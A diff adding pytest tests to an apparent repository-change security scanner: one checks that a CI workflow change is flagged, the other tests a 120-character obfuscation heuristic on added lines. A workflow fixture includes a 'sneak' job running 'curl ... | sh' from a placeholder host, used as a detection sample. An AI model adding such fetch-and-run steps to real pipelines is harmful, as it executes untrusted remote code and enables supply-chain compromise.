@@ -323,3 +323,49 @@ def test_lock_funding_urls_are_silent(tmp_path: Path) -> None:
     _commit(repo, "funding")
     result = _scan(repo, base)
     assert not any(f.section == 5 for f in result["findings"])
+
+
+def test_control_plane_reports_github_file_when_reusing_pinned_action(tmp_path: Path) -> None:
+    repo, base = _base_repo(tmp_path)
+    _write(
+        repo,
+        ".github/workflows/ci.yml",
+        _BASE_WORKFLOW
+        + "  sneak:\n"
+        "    runs-on: ubuntu-latest\n"
+        "    steps:\n"
+        "      - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567\n"
+        "      - run: curl https://example.invalid/s.sh | sh\n",
+    )
+    _commit(repo, "reuse-pinned")
+    result = _scan(repo, base)
+    sec4 = _reasons(result, 4)
+    assert any(
+        p == ".github/workflows/ci.yml" and "control-plane file changed" in r
+        for p, r in sec4
+    ), sec4
+
+
+def test_obfuscation_120_char_boundary_and_added_lines_only(tmp_path: Path) -> None:
+    repo, base = _base_repo(tmp_path)
+    under = "A" * 119
+    exact = "A" * 120
+    _write(repo, "tools/safe.py", f"s = '{under}'\n")
+    head119 = _commit(repo, "under")
+    quiet = _scan(repo, base, head119)
+    assert not any(f.section == 3 for f in quiet["findings"]), _reasons(quiet, 3)
+
+    _write(repo, "tools/safe.py", f"s = '{exact}'\n")
+    head120 = _commit(repo, "exact")
+    hit = _scan(repo, base, head120)
+    assert any(
+        f.section == 3 and "120+" in f.reason for f in hit["findings"]
+    ), _reasons(hit, 3)
+
+    repo2, base2 = _base_repo(tmp_path / "added-only")
+    _write(repo2, "tools/safe.py", f"s = '{exact}'\nVALUE = 1\n")
+    base2 = _commit(repo2, "already-long")
+    _write(repo2, "tools/safe.py", f"s = '{exact}'\nVALUE = 2\n")
+    _commit(repo2, "touch-other-line")
+    only_added = _scan(repo2, base2)
+    assert not any(f.section == 3 for f in only_added["findings"]), _reasons(only_added, 3)
